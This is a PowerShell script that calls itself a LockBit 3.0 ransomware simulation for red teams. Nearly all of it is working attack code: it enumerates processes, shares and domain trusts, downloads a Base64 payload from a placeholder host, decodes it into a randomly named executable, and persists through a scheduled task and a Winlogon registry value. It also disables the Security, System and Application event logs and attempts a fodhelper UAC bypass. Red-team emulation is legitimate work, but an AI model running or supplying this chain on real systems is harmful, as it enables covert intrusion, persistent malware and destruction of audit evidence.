
<#
.SYNOPSIS
    Advanced LockBit 3.0 Ransomware Simulation PowerShell Script for Red Teaming.

.DESCRIPTION
    Performs discovery, payload download & decoding, persistence, defense evasion, UAC bypass simulation,
    with randomized file names, error handling, logging for red team use.

.NOTES
    - Requires running with appropriate privileges.
    - Designed to run on Windows 10+.
#>

# Define helper function for logging
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logLine = "$timestamp - $Message"
    Add-Content -Path $global:LogFile -Value $logLine
}

try {
    # Setup global variables and random filenames for stealth
    $tempDir = "$env:TEMP"
    $randSuffix = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[char]$_})
    $payloadB64 = Join-Path $tempDir "payload_$randSuffix.b64"
    $payloadExe = Join-Path $tempDir "payload_$randSuffix.exe"
    $procList = Join-Path $tempDir "proc_list_$randSuffix.txt"
    $sysInfo = Join-Path $tempDir "sysinfo_$randSuffix.txt"
    $netShares = Join-Path $tempDir "netshares_$randSuffix.txt"
    $domainTrusts = Join-Path $tempDir "domain_trusts_$randSuffix.txt"
    $scheduledTasksLog = Join-Path $tempDir "scheduled_tasks_$randSuffix.txt"
    $global:LogFile = Join-Path $tempDir "lockbit_sim_log_$randSuffix.txt"

    Write-Log "=== LockBit 3.0 Red Team Simulation Started ==="

    # Step 1: Process & System Discovery
    Write-Log "Collecting running processes..."
    tasklist /v | Out-File -FilePath $procList -Encoding ascii
    Write-Log "Collecting system info..."
    systeminfo | Out-File -FilePath $sysInfo -Encoding ascii

    # Step 2: Network & Domain Enumeration
    Write-Log "Enumerating network shares..."
    net view | Out-File -FilePath $netShares -Encoding ascii
    Write-Log "Enumerating domain trusts..."
    nltest /domain_trusts | Out-File -FilePath $domainTrusts -Encoding ascii

    # Step 3: Download Base64 encoded payload (replace URL)
    $payloadUrl = 'http://example.com/obfuscated_payload.b64'
    Write-Log "Downloading Base64 payload from $payloadUrl ..."
    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadB64 -UseBasicParsing -ErrorAction Stop

    # Step 4: Decode Base64 payload to EXE
    Write-Log "Decoding Base64 payload to executable..."
    $b64string = Get-Content $payloadB64 -Raw
    [System.IO.File]::WriteAllBytes($payloadExe, [Convert]::FromBase64String($b64string))

    # Step 5: Persistence - Scheduled Task
    Write-Log "Creating persistence scheduled task..."
    $schtasksArgs = "/Create /SC DAILY /TN LockBitPersistence$randSuffix /TR `"$payloadExe`" /ST 23:45 /F"
    Start-Process schtasks.exe -ArgumentList $schtasksArgs -Wait

    # Step 6: Registry Persistence - Winlogon Helper DLL key
    Write-Log "Modifying registry for Winlogon persistence..."
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Winlogon"
    $regName = "Userinit"
    $regValue = "$payloadExe,"
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue

    # Step 7: Defense Evasion - Disable Windows Event Logs
    Write-Log "Disabling Windows event logs..."
    foreach ($log in @("Security", "System", "Application")) {
        try {
            wevtutil sl $log /e:false
            Write-Log "Disabled $log log."
        } catch {
            Write-Log "Failed to disable $log log: $_"
        }
    }

    # Step 8: UAC Bypass Simulation via fodhelper.exe launch
    Write-Log "Attempting UAC bypass simulation..."
    Start-Process "fodhelper.exe" -ArgumentList $payloadExe

    # Step 9: Cleanup Base64 file
    Write-Log "Cleaning up Base64 payload file..."
    Remove-Item $payloadB64 -Force

    # Step 10: Verify Scheduled Tasks
    Write-Log "Querying scheduled tasks..."
    schtasks /query /fo LIST /v | Out-File $scheduledTasksLog -Encoding ascii

    Write-Log "LockBit 3.0 Red Team Simulation Completed Successfully."
} catch {
    Write-Log "ERROR: $_"
}
